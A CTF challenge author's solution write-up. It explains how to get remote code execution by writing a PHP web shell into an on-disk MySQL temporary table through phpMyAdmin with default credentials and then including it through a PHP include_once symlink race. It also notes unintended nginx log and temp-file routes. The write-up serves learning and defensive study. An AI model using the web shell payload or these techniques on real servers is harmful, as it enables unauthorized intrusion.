# Solution

We need to do two things at once.

1. Login to phpMyAdmin panel (given address) with credential: server / demo / demo (Players can guess the credential from given files)
2. Go to SQL tab and run `use admin_debug;create temporary table exp(pay LONGBLOB);insert into exp values("<?php system($_GET[cmd]); ?>");select sleep(50);`
3. While the sql is executed, run `exp.py`
4. The flag will be printed if the sql race condition succeed.

This challenge is about the bug of php's `include_once` when it gets too many symbolic links. Also, the players must study about MySQL.

https://dev.mysql.com/doc/refman/8.0/en/create-temporary-table.html

If you take a look at the docs above, it tells below

```
...
To create a temporary table, you must have the CREATE TEMPORARY TABLES privilege. After a session has created a temporary table, the server performs no further privilege checks on the table. The creating session can perform any operation on the table, such as DROP TABLE, INSERT, UPDATE, or SELECT.
...
```

Even if I granted the user to perform `select` and `create temporary table` only, the users can insert data on the table. Also, if you take a look at here -

https://dev.mysql.com/doc/refman/8.3/en/internal-temporary-tables.html

```
...

The following variables control TempTable storage engine limits and behavior:

tmp_table_size: Defines the maximum size of any individual in-memory internal temporary table created by the TempTable storage engine. When the tmp_table_size limit is reached, MySQL automatically converts the in-memory internal temporary table to an InnoDB on-disk internal temporary table. The default tmp_table_size setting is 16777216 bytes (16 MiB).
...
```

So, Users can force to create temporary table on the disk by using `LONGBLOB` which supports 4,294,967,295 bytes data (bigger than tmp_table_size). This table will be stored in the disk and we can abuse this to make it RCE.

**Note**
To prevent unintended solution, I did
- Disabled PHP_UPLOAD_PROGRESS
- Disabled Logging
- Disabled tmp file upload
- Disabled Create / Insert permission on DB user to prevent not using temporary table (Unless, it will be easy).
- Exit when wrapper string detected (Detect `:`)
- Reboot MySQL every 30 second to prevent abusing `ibtmp1` (30 second is enough. I checked with my payload)

# Unintended Solution during CTF
- RCE via nginx access.log
  
My configuration disabled php access.log but didn't do it on PMA. So, players abused it by changing the header.

- RCE via nginx temp files
  
https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-nginx-temp-files
